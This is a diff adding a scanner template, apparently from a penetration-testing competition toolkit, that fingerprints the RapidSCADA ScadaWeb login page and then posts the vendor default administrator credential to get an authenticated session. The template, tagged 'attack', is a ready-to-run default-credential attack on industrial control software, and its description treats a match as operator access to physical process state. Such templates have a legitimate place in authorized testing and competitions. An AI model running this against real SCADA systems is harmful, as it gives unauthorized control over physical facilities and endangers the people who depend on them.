@@ -1,0 +1,67 @@
+# RapidSCADA v5 webstation login page and default credential attempt.
+id: rapidscada-web-login
+
+info:
+  name: RapidSCADA Webstation Default Credentials
+  author: cptc-toolkit
+  severity: high
+  metadata:
+    max-request: 2
+    kind: attack
+  description: |
+    RapidSCADA is a self-hosted SCADA webstation used for ride and facility
+    monitoring. The v5 webstation documents the default administrator
+    credential admin:12345 and stock deployments keep it.
+
+    This template first confirms the ScadaWeb login surface by its
+    product-specific form fields, then POSTs the documented default. A match
+    means an authenticated SCADA session: live station views, event logs and
+    formula/configuration screens. This is operator access to physical
+    process state, treat it as a shell-equivalent finding.
+
+    One GET and one POST. The credential is a documented vendor default.
+  reference:
+    - https://rapidscada.org/
+  tags: ot,scada,default-login,attack
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ScadaWeb/LogIn.aspx"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ScadaWeb"
+          - "__VIEWSTATE"
+        condition: and
+
+  - raw:
+      - |
+        POST /ScadaWeb/LogIn.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        __VIEWSTATE=&username=admin&password=12345&btnLogIn=Log+In
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "Webstation"
+          - "Logout"
+          - "TableListView"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "LogIn.aspx"
+          - "Invalid"
